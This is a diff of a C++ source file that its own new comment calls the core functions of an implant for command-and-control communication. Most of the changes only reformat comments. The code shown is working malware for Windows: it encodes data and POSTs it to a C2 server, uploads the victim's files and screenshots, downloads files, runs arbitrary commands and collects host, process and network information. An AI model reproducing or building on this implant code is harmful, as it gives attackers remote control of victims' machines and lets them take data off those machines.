@@ -1,8 +1,12 @@
 #include "core.h"
 
+/*
+	The core functions of the implant
+	All of these are either used for C2 <-> implant communication or executing a task from the C2
+*/
 
-//Encodes and sends data in one easy function
-//Returns string output
+// Encodes and sends data in one easy function
+// Returns string output
 std::string sendEncodedString(struct Strings* strings, std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
 	std::string result = encode(key, data);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
@@ -27,8 +31,8 @@ std::string sendEncodedString(struct Strings* strings, std::string key, std::str
 }
 
 
-//Uploads file to server via HTTP POST
-//Params: handle for internet, path of file to upload, key for XOR "encryption" 
+// Uploads file to server via HTTP POST
+// Params: handle for internet, path of file to upload, key for XOR "encryption" 
 BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int xorKey, std::string endpoint) {
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
@@ -65,8 +69,8 @@ BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int 
 }
 
 
-//Uploads screenshot to server via HTTP POST
-//Params: handle for internet, path of file to upload, key for XOR "encryption" 
+// Uploads screenshot to server via HTTP POST
+// Params: handle for internet, path of file to upload, key for XOR "encryption" 
 BOOL doScreenshotUpload(struct Strings* strings, HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint) {
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
@@ -101,7 +105,7 @@ BOOL doScreenshotUpload(struct Strings* strings, HANDLE hConnect, std::vector<BY
 }
 
 
-//Downloads file to path
+// Downloads file to path
 BOOL doFileDownload(std::string url, std::string filepath) {
 	if (S_OK == URLDownloadToFileA(NULL, url.c_str(), filepath.c_str(), 0, NULL))
 		return TRUE;
@@ -109,8 +113,8 @@ BOOL doFileDownload(std::string url, std::string filepath) {
 }
 
 
-//Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
-//Returns JSON string buffer containing command and output in format {"command": "whoami", "output": "Administrator"}
+// Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
+// Returns JSON string buffer containing command and output in format {"command": "whoami", "output": "Administrator"}
 std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	nlohmann::json jsonInfo;
 	jsonInfo["command"] = cmd;
@@ -201,8 +205,8 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 }
 
 
-//Gathers OS information via ProductName and DisplayVersion registry keys
-//Returns JSON string in format {"DisplayVersion":"21H1","ProductName":"Windows 10 Home"}
+// Gathers OS information via ProductName and DisplayVersion registry keys
+// Returns JSON string in format {"DisplayVersion":"21H1","ProductName":"Windows 10 Home"}
 std::string getOSInfo(struct Strings* strings) {
 	nlohmann::json jsonInfo;
 	char value[256];
@@ -216,7 +220,7 @@ std::string getOSInfo(struct Strings* strings) {
 }
 
 
-//Attempts to get public IP of user by reaching out to ifconfig.me
+// Attempts to get public IP of user by reaching out to ifconfig.me
 std::string getPublicIP(HANDLE hInternet) {
 	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
@@ -229,7 +233,7 @@ std::string getPublicIP(HANDLE hInternet) {
 }
 
 
-//Gets list of current running processes and converts to JSON string
+// Gets list of current running processes and converts to JSON string
 // JSON in format PID, name {"1160":"Calculator.exe","11656":"chrome.exe"...}
 std::string getProcToStr() {
 	nlohmann::json jsonInfo;
@@ -252,7 +256,7 @@ std::string getProcToStr() {
 }
 
 
-//Kills process PID
+// Kills process PID
 BOOLEAN killProcess(DWORD pid) {
 	std::string proclst;
 	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -271,8 +275,8 @@ BOOLEAN killProcess(DWORD pid) {
 }
 
 
-//Gets list of network interfaces and converts MAC/IP addresses JSON in format
-//{interfacename: {"ip":ip, "mac":mac}}
+// Gets list of network interfaces and converts MAC/IP addresses JSON in format
+// {interfacename}: {"ip":ip, "mac":mac}}
 std::string getNetworkInfo() {
 	nlohmann::json jsonInfo;
 
